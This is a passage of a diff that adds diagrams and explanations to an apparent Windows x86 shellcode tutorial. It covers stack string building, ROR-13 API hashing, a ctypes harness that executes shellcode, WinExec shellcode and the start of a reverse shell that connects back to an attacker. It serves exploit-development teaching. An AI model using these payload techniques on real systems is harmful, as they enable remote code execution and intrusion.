+  <text x="40" y="83" fill="#a6e3a1" font-size="12" font-weight="bold">Step 2:</text>
+  <text x="110" y="83" fill="#cdd6f4" font-size="12">mov eax, 0x657865</text>
+  <text x="350" y="83" fill="#6c7086" font-size="10">EAX = 0x00657865 = "exe\0" (high byte stays zero!)</text>
+  <!-- Step 3 -->
+  <text x="40" y="108" fill="#a6e3a1" font-size="12" font-weight="bold">Step 3:</text>
+  <text x="110" y="108" fill="#cdd6f4" font-size="12">push eax</text>
+  <text x="350" y="108" fill="#6c7086" font-size="10">Push "exe\0" onto stack</text>
+  <!-- Step 4 -->
+  <text x="40" y="133" fill="#a6e3a1" font-size="12" font-weight="bold">Step 4:</text>
+  <text x="110" y="133" fill="#cdd6f4" font-size="12">push 0x2e646d63</text>
+  <text x="350" y="133" fill="#6c7086" font-size="10">Push "cmd." onto stack</text>
+  <!-- Stack memory layout -->
+  <text x="375" y="168" text-anchor="middle" fill="#fab387" font-size="13" font-weight="bold">Stack Memory (after pushes)</text>
+  <!-- Memory bytes -->
+  <rect x="100" y="178" width="50" height="38" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="125" y="195" text-anchor="middle" fill="#cdd6f4" font-size="13">63</text>
+  <text x="125" y="212" text-anchor="middle" fill="#a6e3a1" font-size="9">'c'</text>
+  <rect x="155" y="178" width="50" height="38" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="180" y="195" text-anchor="middle" fill="#cdd6f4" font-size="13">6d</text>
+  <text x="180" y="212" text-anchor="middle" fill="#a6e3a1" font-size="9">'m'</text>
+  <rect x="210" y="178" width="50" height="38" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="235" y="195" text-anchor="middle" fill="#cdd6f4" font-size="13">64</text>
+  <text x="235" y="212" text-anchor="middle" fill="#a6e3a1" font-size="9">'d'</text>
+  <rect x="265" y="178" width="50" height="38" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="290" y="195" text-anchor="middle" fill="#cdd6f4" font-size="13">2e</text>
+  <text x="290" y="212" text-anchor="middle" fill="#a6e3a1" font-size="9">'.'</text>
+  <rect x="320" y="178" width="50" height="38" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="345" y="195" text-anchor="middle" fill="#cdd6f4" font-size="13">65</text>
+  <text x="345" y="212" text-anchor="middle" fill="#a6e3a1" font-size="9">'e'</text>
+  <rect x="375" y="178" width="50" height="38" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="400" y="195" text-anchor="middle" fill="#cdd6f4" font-size="13">78</text>
+  <text x="400" y="212" text-anchor="middle" fill="#a6e3a1" font-size="9">'x'</text>
+  <rect x="430" y="178" width="50" height="38" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="455" y="195" text-anchor="middle" fill="#cdd6f4" font-size="13">65</text>
+  <text x="455" y="212" text-anchor="middle" fill="#a6e3a1" font-size="9">'e'</text>
+  <rect x="485" y="178" width="50" height="38" rx="3" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
+  <text x="510" y="195" text-anchor="middle" fill="#f38ba8" font-size="13" font-weight="bold">00</text>
+  <text x="510" y="212" text-anchor="middle" fill="#f38ba8" font-size="9">'\0'</text>
+  <!-- Labels -->
+  <line x1="100" y1="225" x2="315" y2="225" stroke="#fab387" stroke-width="1.5"/>
+  <text x="207" y="245" text-anchor="middle" fill="#fab387" font-size="10">push 0x2e646d63 ("cmd.")</text>
+  <line x1="320" y1="225" x2="535" y2="225" stroke="#fab387" stroke-width="1.5"/>
+  <text x="427" y="245" text-anchor="middle" fill="#fab387" font-size="10">push 0x00657865 ("exe\0")</text>
+  <!-- ESP pointer -->
+  <text x="60" y="198" fill="#f38ba8" font-size="11">ESP--></text>
+  <text x="570" y="198" fill="#6c7086" font-size="10">Higher addr --></text>
+  <!-- Final -->
+  <rect x="100" y="262" width="540" height="40" rx="5" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="370" y="278" text-anchor="middle" fill="#a6e3a1" font-size="12" font-weight="bold">mov esi, esp</text>
+  <text x="370" y="295" text-anchor="middle" fill="#cdd6f4" font-size="11">ESI now points to "cmd.exe\0" -- ready for WinExec or CreateProcessA</text>
+</svg></div>
 
 Fix with zero-extend:
 
@@ -682,13 +1042,90 @@ $ python hash.py LoadLibraryA CreateProcessA ExitProcess WSAStartup WSASocketA c
 
 These are the exact values we embed as immediates in our shellcode.
 
+<div align="center"><svg viewBox="0 0 750 310" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <rect width="750" height="310" rx="8" fill="#1e1e2e"/>
+  <text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">ROR-13 Hash: Processing "L" (first char of LoadLibraryA)</text>
+  <!-- Initial state -->
+  <text x="40" y="58" fill="#fab387" font-size="12" font-weight="bold">Initial EDX:</text>
+  <text x="170" y="58" fill="#cdd6f4" font-size="12">0x00000000</text>
+  <!-- Bit representation before -->
+  <text x="40" y="85" fill="#89b4fa" font-size="11" font-weight="bold">Before ROR 13:</text>
+  <rect x="180" y="70" width="540" height="26" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="450" y="88" text-anchor="middle" fill="#cdd6f4" font-size="10">00000000 00000000 00000000 00000000</text>
+  <!-- ROR operation -->
+  <text x="375" y="115" text-anchor="middle" fill="#a6e3a1" font-size="12">ror edx, 13  (rotate right 13 bits -- no change when zero)</text>
+  <!-- Add character -->
+  <text x="40" y="145" fill="#a6e3a1" font-size="11" font-weight="bold">Add 'L' (0x4C):</text>
+  <text x="200" y="145" fill="#cdd6f4" font-size="11">EDX = 0x00000000 + 0x4C = 0x0000004C</text>
+  <!-- Result bits -->
+  <rect x="180" y="155" width="540" height="26" rx="3" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="450" y="173" text-anchor="middle" fill="#a6e3a1" font-size="10">00000000 00000000 00000000 01001100</text>
+  <!-- Second iteration -->
+  <rect x="30" y="195" width="690" height="95" rx="6" fill="#313244" stroke="#fab387" stroke-width="1.5"/>
+  <text x="375" y="215" text-anchor="middle" fill="#fab387" font-size="12" font-weight="bold">Next iteration: char 'o' (0x6F)</text>
+  <text x="50" y="240" fill="#cdd6f4" font-size="11">ROR 13:  0x0000004C >> 13 | 0x0000004C &lt;&lt; 19 = 0x00260000</text>
+  <text x="50" y="260" fill="#a6e3a1" font-size="11">Add 'o': 0x00260000 + 0x6F = 0x0026006F</text>
+  <text x="50" y="280" fill="#6c7086" font-size="10">Each character rotates the accumulator right 13 bits, then adds the ASCII value</text>
+</svg></div>
+
 > **Important:** The hash algorithm in your shellcode and in your Python script must be identical. If you split the rotation for bad character avoidance (e.g., `ror edx, 7` + `ror edx, 6` instead of `ror edx, 13`), the total rotation is still 13, so the hashes remain the same.
 
 ---
 
 ## 8. Testing Shellcode: Keystone and ctypes
 
+Before we write real payloads, we need a fast development loop. Three tools make this possible: **Keystone** (assembler), a **bad character scanner**, and **ctypes** (executor).
+
+<div align="center"><svg viewBox="0 0 750 300" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <defs>
+    <marker id="dev-a" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker>
+    <marker id="dev-r" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#f38ba8"/></marker>
+  </defs>
+  <rect width="750" height="300" rx="8" fill="#1e1e2e"/>
+  <text x="375" y="30" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">Shellcode Development Pipeline</text>
+  <!-- Step 1: Write -->
+  <rect x="30" y="60" width="120" height="60" rx="8" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+  <text x="90" y="85" text-anchor="middle" fill="#89b4fa" font-size="12" font-weight="bold">1. Write</text>
+  <text x="90" y="102" text-anchor="middle" fill="#cdd6f4" font-size="10">NASM Assembly</text>
+  <line x1="150" y1="90" x2="185" y2="90" stroke="#a6e3a1" stroke-width="2" marker-end="url(#dev-a)"/>
+  <!-- Step 2: Assemble -->
+  <rect x="190" y="60" width="120" height="60" rx="8" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+  <text x="250" y="85" text-anchor="middle" fill="#89b4fa" font-size="12" font-weight="bold">2. Assemble</text>
+  <text x="250" y="102" text-anchor="middle" fill="#cdd6f4" font-size="10">Keystone</text>
+  <line x1="310" y1="90" x2="345" y2="90" stroke="#a6e3a1" stroke-width="2" marker-end="url(#dev-a)"/>
+  <!-- Step 3: Scan -->
+  <rect x="350" y="60" width="120" height="60" rx="8" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
+  <text x="410" y="85" text-anchor="middle" fill="#f38ba8" font-size="12" font-weight="bold">3. Scan</text>
+  <text x="410" y="102" text-anchor="middle" fill="#cdd6f4" font-size="10">Bad Chars?</text>
+  <line x1="470" y1="90" x2="505" y2="90" stroke="#a6e3a1" stroke-width="2" marker-end="url(#dev-a)"/>
+  <!-- Step 4: Execute -->
+  <rect x="510" y="60" width="120" height="60" rx="8" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
+  <text x="570" y="85" text-anchor="middle" fill="#a6e3a1" font-size="12" font-weight="bold">4. Execute</text>
+  <text x="570" y="102" text-anchor="middle" fill="#cdd6f4" font-size="10">ctypes</text>
+  <line x1="630" y1="90" x2="665" y2="90" stroke="#a6e3a1" stroke-width="2" marker-end="url(#dev-a)"/>
+  <!-- Step 5: Debug -->
+  <rect x="510" y="150" width="120" height="60" rx="8" fill="#313244" stroke="#fab387" stroke-width="2"/>
+  <text x="570" y="175" text-anchor="middle" fill="#fab387" font-size="12" font-weight="bold">5. Debug</text>
+  <text x="570" y="192" text-anchor="middle" fill="#cdd6f4" font-size="10">WinDbg</text>
+  <!-- Step 6: Fix -->
+  <rect x="190" y="150" width="120" height="60" rx="8" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
+  <text x="250" y="175" text-anchor="middle" fill="#f38ba8" font-size="12" font-weight="bold">6. Fix</text>
+  <text x="250" y="192" text-anchor="middle" fill="#cdd6f4" font-size="10">Adjust ASM</text>
+  <!-- Arrows for the loop -->
+  <line x1="570" y1="120" x2="570" y2="145" stroke="#a6e3a1" stroke-width="2" marker-end="url(#dev-a)"/>
+  <line x1="510" y1="180" x2="315" y2="180" stroke="#f38ba8" stroke-width="2" marker-end="url(#dev-r)"/>
+  <path d="M 250,150 L 250,120" stroke="#f38ba8" stroke-width="2" marker-end="url(#dev-r)"/>
+  <!-- Annotations -->
+  <rect x="90" y="240" width="570" height="40" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="375" y="260" text-anchor="middle" fill="#a6e3a1" font-size="12">Each iteration takes under a minute. Fix -> Reassemble -> Retest until clean.</text>
+  <text x="375" y="276" text-anchor="middle" fill="#6c7086" font-size="10">Repeat steps 2-6 until no bad characters and the payload works correctly.</text>
+</svg></div>
+
+*Figure 8.1 - The shellcode development cycle: write, assemble, scan, execute, debug, fix, repeat.*
+
 ### Assembling with Keystone
+
+Keystone converts our NASM assembly into raw machine code bytes.
 
 ```python
 from keystone import Ks, KS_ARCH_X86, KS_MODE_32
@@ -707,6 +1144,8 @@ print(f"[+] Assembled {count} instructions, {len(shellcode)} bytes")
 ```
 
 ### Bad Character Scanner
+
+After assembling, we scan the output for any byte that would break delivery.
 
 ```python
 BAD_CHARS = set([0x00, 0x0a, 0x0d])
@@ -727,6 +1166,8 @@ def check_bad_chars(shellcode, bad_chars):
 
 ### Executing with ctypes
 
+We allocate executable memory, copy our shellcode in, and jump to it.
+
 ```python
 import ctypes
 
@@ -740,6 +1181,34 @@ shellcode_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(ctypes.c_void_p))
 shellcode_func()
 ```
 
+<div align="center"><svg viewBox="0 0 750 220" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <defs>
+    <marker id="ct-a" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker>
+  </defs>
+  <rect width="750" height="220" rx="8" fill="#1e1e2e"/>
+  <text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">ctypes Execution Flow</text>
+  <rect x="30" y="55" width="160" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+  <text x="110" y="78" text-anchor="middle" fill="#89b4fa" font-size="11" font-weight="bold">VirtualAlloc</text>
+  <text x="110" y="95" text-anchor="middle" fill="#cdd6f4" font-size="10">RWX memory page</text>
+  <line x1="190" y1="82" x2="225" y2="82" stroke="#a6e3a1" stroke-width="2" marker-end="url(#ct-a)"/>
+  <rect x="230" y="55" width="160" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+  <text x="310" y="78" text-anchor="middle" fill="#89b4fa" font-size="11" font-weight="bold">memcpy</text>
+  <text x="310" y="95" text-anchor="middle" fill="#cdd6f4" font-size="10">Copy shellcode bytes</text>
+  <line x1="390" y1="82" x2="425" y2="82" stroke="#a6e3a1" stroke-width="2" marker-end="url(#ct-a)"/>
+  <rect x="430" y="55" width="160" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+  <text x="510" y="78" text-anchor="middle" fill="#89b4fa" font-size="11" font-weight="bold">CFUNCTYPE cast</text>
+  <text x="510" y="95" text-anchor="middle" fill="#cdd6f4" font-size="10">Pointer to function</text>
+  <line x1="590" y1="82" x2="625" y2="82" stroke="#a6e3a1" stroke-width="2" marker-end="url(#ct-a)"/>
+  <rect x="630" y="55" width="90" height="55" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
+  <text x="675" y="78" text-anchor="middle" fill="#a6e3a1" font-size="11" font-weight="bold">Call!</text>
+  <text x="675" y="95" text-anchor="middle" fill="#cdd6f4" font-size="10">Execute</text>
+  <rect x="100" y="140" width="550" height="55" rx="6" fill="#313244" stroke="#fab387" stroke-width="1.5"/>
+  <text x="375" y="162" text-anchor="middle" fill="#fab387" font-size="12" font-weight="bold">Memory Layout After Setup</text>
+  <text x="375" y="182" text-anchor="middle" fill="#cdd6f4" font-size="11">[VirtualAlloc addr] -> [shellcode bytes copied here] -> EIP jumps here</text>
+</svg></div>
+
+*Figure 8.2 - The ctypes harness allocates RWX memory, copies shellcode in, then calls it as a function pointer.*
+
 ### Debugging with WinDbg
 
 Insert `int3` at the start. Launch under WinDbg. Key commands: `t` (step), `r` (registers), `dd esp` (dump stack), `db esi` (display bytes), `u eip L20` (disassemble).
@@ -752,11 +1221,46 @@ With our toolkit complete, we are ready to write real payloads.
 
 ## 9. Your First Shellcode: WinExec
 
-Everything we have built so far -- the PEB walk, the export table parser, the ROR-13 hash resolver -- has been infrastructure. Now we put it all to work and write shellcode that actually *does* something: pop a command shell with `WinExec`.
+Everything we have built so far has been infrastructure. Now we put it all to work and write shellcode that actually *does* something: pop a command shell with `WinExec`.
 
 ### The Game Plan
 
-We resolve three functions from kernel32.dll, stashing each at a known EBP offset:
+We resolve three functions from kernel32.dll, stashing each at a known EBP offset.
+
+<div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <defs>
+    <marker id="we-a" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker>
+  </defs>
+  <rect width="750" height="260" rx="8" fill="#1e1e2e"/>
+  <text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">WinExec: API Resolution Map</text>
+  <!-- EBP variable table -->
+  <rect x="30" y="50" width="280" height="180" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+  <text x="170" y="72" text-anchor="middle" fill="#89b4fa" font-size="12" font-weight="bold">EBP Variable Table</text>
+  <rect x="45" y="82" width="250" height="28" rx="4" fill="#1e1e2e" stroke="#6c7086" stroke-width="1"/>
+  <text x="170" y="100" text-anchor="middle" fill="#6c7086" font-size="11">[ebp+0x04] = find_function</text>
+  <rect x="45" y="116" width="250" height="28" rx="4" fill="#1e1e2e" stroke="#f38ba8" stroke-width="1.5"/>
+  <text x="170" y="134" text-anchor="middle" fill="#f38ba8" font-size="11">[ebp+0x10] = TerminateProcess</text>
+  <rect x="45" y="150" width="250" height="28" rx="4" fill="#1e1e2e" stroke="#fab387" stroke-width="1.5"/>
+  <text x="170" y="168" text-anchor="middle" fill="#fab387" font-size="11">[ebp+0x14] = LoadLibraryA</text>
+  <rect x="45" y="184" width="250" height="28" rx="4" fill="#1e1e2e" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="170" y="202" text-anchor="middle" fill="#a6e3a1" font-size="11">[ebp+0x18] = WinExec</text>
+  <!-- Resolution arrows -->
+  <rect x="400" y="82" width="310" height="42" rx="5" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/>
+  <text x="555" y="100" text-anchor="middle" fill="#cdd6f4" font-size="11">push 0x78b5b983; call [ebp+0x04]</text>
+  <text x="555" y="116" text-anchor="middle" fill="#f38ba8" font-size="10">ROR13("TerminateProcess")</text>
+  <line x1="400" y1="103" x2="300" y2="130" stroke="#f38ba8" stroke-width="1.5" marker-end="url(#we-a)"/>
+  <rect x="400" y="132" width="310" height="42" rx="5" fill="#313244" stroke="#fab387" stroke-width="1.5"/>
+  <text x="555" y="150" text-anchor="middle" fill="#cdd6f4" font-size="11">push 0xec0e4e8e; call [ebp+0x04]</text>
+  <text x="555" y="166" text-anchor="middle" fill="#fab387" font-size="10">ROR13("LoadLibraryA")</text>
+  <line x1="400" y1="153" x2="300" y2="164" stroke="#fab387" stroke-width="1.5" marker-end="url(#we-a)"/>
+  <rect x="400" y="182" width="310" height="42" rx="5" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="555" y="200" text-anchor="middle" fill="#cdd6f4" font-size="11">push 0x0e8afe98; call [ebp+0x04]</text>
+  <text x="555" y="216" text-anchor="middle" fill="#a6e3a1" font-size="10">ROR13("WinExec")</text>
+  <line x1="400" y1="203" x2="300" y2="198" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#we-a)"/>
+  <text x="375" y="248" text-anchor="middle" fill="#6c7086" font-size="11">Three push+call+mov sequences fill the variable table</text>
+</svg></div>
+
+*Figure 9.1 - Each API is resolved by pushing its ROR-13 hash, calling find_function, and storing the result at a known EBP offset.*
 
 ```nasm
 resolve_symbols_kernel32:
@@ -774,6 +1278,51 @@ resolve_symbols_kernel32:
 ```
 
 ### Building "cmd.exe" and Calling WinExec
+
+We construct the string `"cmd.exe\0"` on the stack using two pushes, then call WinExec.
+
+<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <defs>
+    <marker id="we-b" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker>
+  </defs>
+  <rect width="750" height="280" rx="8" fill="#1e1e2e"/>
+  <text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">Building "cmd.exe" on the Stack</text>
+  <!-- String bytes -->
+  <text x="375" y="55" text-anchor="middle" fill="#6c7086" font-size="11">Stack grows downward -- push in reverse order</text>
+  <!-- Push 1: "exe\0" -->
+  <rect x="70" y="70" width="610" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="130" y="90" text-anchor="middle" fill="#89b4fa" font-size="11" font-weight="bold">Step 1:</text>
+  <text x="130" y="108" text-anchor="middle" fill="#cdd6f4" font-size="10">mov eax, 0x657865</text>
+  <rect x="290" y="78" width="40" height="28" rx="3" fill="#1e1e2e" stroke="#a6e3a1" stroke-width="1"/>
+  <text x="310" y="96" text-anchor="middle" fill="#a6e3a1" font-size="12">\0</text>
+  <rect x="335" y="78" width="40" height="28" rx="3" fill="#1e1e2e" stroke="#f38ba8" stroke-width="1"/>
+  <text x="355" y="96" text-anchor="middle" fill="#f38ba8" font-size="12">e</text>
+  <rect x="380" y="78" width="40" height="28" rx="3" fill="#1e1e2e" stroke="#f38ba8" stroke-width="1"/>
+  <text x="400" y="96" text-anchor="middle" fill="#f38ba8" font-size="12">x</text>
+  <rect x="425" y="78" width="40" height="28" rx="3" fill="#1e1e2e" stroke="#f38ba8" stroke-width="1"/>
+  <text x="445" y="96" text-anchor="middle" fill="#f38ba8" font-size="12">e</text>
+  <text x="560" y="96" text-anchor="middle" fill="#cdd6f4" font-size="10">= 0x00657865 (high byte = \0)</text>
+  <!-- Push 2: "cmd." -->
+  <rect x="70" y="125" width="610" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="130" y="145" text-anchor="middle" fill="#89b4fa" font-size="11" font-weight="bold">Step 2:</text>
+  <text x="130" y="163" text-anchor="middle" fill="#cdd6f4" font-size="10">push 0x2e646d63</text>
+  <rect x="290" y="133" width="40" height="28" rx="3" fill="#1e1e2e" stroke="#fab387" stroke-width="1"/>
+  <text x="310" y="151" text-anchor="middle" fill="#fab387" font-size="12">c</text>
+  <rect x="335" y="133" width="40" height="28" rx="3" fill="#1e1e2e" stroke="#fab387" stroke-width="1"/>
+  <text x="355" y="151" text-anchor="middle" fill="#fab387" font-size="12">m</text>
+  <rect x="380" y="133" width="40" height="28" rx="3" fill="#1e1e2e" stroke="#fab387" stroke-width="1"/>
+  <text x="400" y="151" text-anchor="middle" fill="#fab387" font-size="12">d</text>
+  <rect x="425" y="133" width="40" height="28" rx="3" fill="#1e1e2e" stroke="#fab387" stroke-width="1"/>
+  <text x="445" y="151" text-anchor="middle" fill="#fab387" font-size="12">.</text>
+  <text x="560" y="151" text-anchor="middle" fill="#cdd6f4" font-size="10">= 0x2e646d63 (little-endian)</text>
+  <!-- Result on stack -->
+  <rect x="200" y="190" width="350" height="70" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
+  <text x="375" y="212" text-anchor="middle" fill="#a6e3a1" font-size="12" font-weight="bold">Stack (ESP points here):</text>
+  <text x="375" y="232" text-anchor="middle" fill="#cdd6f4" font-size="14">c m d . e x e \0</text>
+  <text x="375" y="250" text-anchor="middle" fill="#6c7086" font-size="10">mov esi, esp --> ESI points to "cmd.exe"</text>
+</svg></div>
+
+*Figure 9.2 - String construction: push DWORDs in reverse order so the string reads forward at ESP.*
 
 ```nasm
 call_winexec:
@@ -798,16 +1347,46 @@ That is it. When this shellcode runs, a `cmd.exe` window appears. Roughly 120 by
 
 A **reverse shell** is the workhorse of remote exploitation. The target reaches out to a listener the attacker already has running, punching through firewalls that block inbound connections.
 
-The high-level flow:
+The high-level flow has six steps, each building on the last.
 
-1. Load `ws2_32.dll` (Winsock)
-2. Initialize Winsock with `WSAStartup`
-3. Create a TCP socket with `WSASocketA`
-4. Connect back to the attacker with `connect`
-5. Build a `STARTUPINFOA` that redirects stdin/stdout/stderr to the socket
-6. Spawn `cmd.exe` with `CreateProcessA`
+<div align="center"><svg viewBox="0 0 750 180" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <defs>
+    <marker id="rs-a" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker>
+  </defs>
+  <rect width="750" height="180" rx="8" fill="#1e1e2e"/>
+  <text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">Reverse Shell: 6-Step Pipeline</text>
+  <rect x="15" y="55" width="108" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="69" y="76" text-anchor="middle" fill="#89b4fa" font-size="10" font-weight="bold">1. Load DLL</text>
+  <text x="69" y="94" text-anchor="middle" fill="#cdd6f4" font-size="9">ws2_32.dll</text>
+  <line x1="123" y1="82" x2="138" y2="82" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#rs-a)"/>
+  <rect x="140" y="55" width="108" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="194" y="76" text-anchor="middle" fill="#89b4fa" font-size="10" font-weight="bold">2. WSAStartup</text>
+  <text x="194" y="94" text-anchor="middle" fill="#cdd6f4" font-size="9">Init Winsock</text>
+  <line x1="248" y1="82" x2="263" y2="82" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#rs-a)"/>
+  <rect x="265" y="55" width="108" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="319" y="76" text-anchor="middle" fill="#89b4fa" font-size="10" font-weight="bold">3. WSASocketA</text>
+  <text x="319" y="94" text-anchor="middle" fill="#cdd6f4" font-size="9">TCP socket</text>
+  <line x1="373" y1="82" x2="388" y2="82" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#rs-a)"/>
+  <rect x="390" y="55" width="108" height="55" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
+  <text x="444" y="76" text-anchor="middle" fill="#f38ba8" font-size="10" font-weight="bold">4. connect()</text>
+  <text x="444" y="94" text-anchor="middle" fill="#cdd6f4" font-size="9">To attacker</text>
+  <line x1="498" y1="82" x2="513" y2="82" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#rs-a)"/>
+  <rect x="515" y="55" width="108" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="569" y="76" text-anchor="middle" fill="#89b4fa" font-size="10" font-weight="bold">5. STARTUPINFO</text>
+  <text x="569" y="94" text-anchor="middle" fill="#cdd6f4" font-size="9">stdio = socket</text>
+  <line x1="623" y1="82" x2="638" y2="82" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#rs-a)"/>
+  <rect x="640" y="55" width="96" height="55" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
+  <text x="688" y="76" text-anchor="middle" fill="#a6e3a1" font-size="10" font-weight="bold">6. Spawn</text>
+  <text x="688" y="94" text-anchor="middle" fill="#cdd6f4" font-size="9">cmd.exe</text>
+  <rect x="120" y="130" width="510" height="35" rx="6" fill="#313244" stroke="#6c7086" stroke-width="1" stroke-dasharray="4,3"/>
+  <text x="375" y="152" text-anchor="middle" fill="#6c7086" font-size="11">Steps 1-3 build the connection infrastructure; Steps 4-6 establish the interactive shell</text>
+</svg></div>
+
+*Figure 10.0 - The six-step reverse shell pipeline: load Winsock, initialize, create socket, connect, configure stdio, spawn shell.*
 
 ### Loading ws2_32.dll and Resolving Winsock Functions
+
+We build the string `"ws2_32.dll"` on the stack and call `LoadLibraryA`.
 
 ```nasm
 load_ws2_32:
@@ -825,6 +1404,58 @@ load_ws2_32:
 
 ### Building sockaddr_in with NOT Encoding
 
+The `sockaddr_in` structure tells `connect()` where to call home. We must build it without null bytes.
+
+<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <rect width="750" height="280" rx="8" fill="#1e1e2e"/>
+  <text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">sockaddr_in Memory Layout (16 bytes)</text>
+  <text x="375" y="52" text-anchor="middle" fill="#6c7086" font-size="11">Pushed in reverse order so fields read correctly at ESP</text>
+  <!-- Byte grid header -->
+  <text x="110" y="80" text-anchor="middle" fill="#6c7086" font-size="10">Offset</text>
+  <text x="220" y="80" text-anchor="middle" fill="#6c7086" font-size="10">Byte 0</text>
+  <text x="310" y="80" text-anchor="middle" fill="#6c7086" font-size="10">Byte 1</text>
+  <text x="400" y="80" text-anchor="middle" fill="#6c7086" font-size="10">Byte 2</text>
+  <text x="490" y="80" text-anchor="middle" fill="#6c7086" font-size="10">Byte 3</text>
+  <text x="620" y="80" text-anchor="middle" fill="#6c7086" font-size="10">Field</text>
+  <!-- Row 1: sin_family + sin_port -->
+  <rect x="60" y="90" width="80" height="32" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="100" y="110" text-anchor="middle" fill="#89b4fa" font-size="11">+0x00</text>
+  <rect x="170" y="90" width="80" height="32" rx="3" fill="#1e1e2e" stroke="#fab387" stroke-width="1.5"/>
+  <text x="210" y="110" text-anchor="middle" fill="#fab387" font-size="11">0x02</text>
+  <rect x="260" y="90" width="80" height="32" rx="3" fill="#1e1e2e" stroke="#fab387" stroke-width="1.5"/>
+  <text x="300" y="110" text-anchor="middle" fill="#fab387" font-size="11">0x00</text>
+  <rect x="350" y="90" width="80" height="32" rx="3" fill="#1e1e2e" stroke="#f38ba8" stroke-width="1.5"/>
+  <text x="390" y="110" text-anchor="middle" fill="#f38ba8" font-size="11">0x01</text>
+  <rect x="440" y="90" width="80" height="32" rx="3" fill="#1e1e2e" stroke="#f38ba8" stroke-width="1.5"/>
+  <text x="480" y="110" text-anchor="middle" fill="#f38ba8" font-size="11">0xBB</text>
+  <text x="620" y="106" text-anchor="middle" fill="#fab387" font-size="10">sin_family=2</text>
+  <text x="620" y="118" text-anchor="middle" fill="#f38ba8" font-size="10">sin_port=443</text>
+  <!-- Row 2: sin_addr -->
+  <rect x="60" y="128" width="80" height="32" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="100" y="148" text-anchor="middle" fill="#89b4fa" font-size="11">+0x04</text>
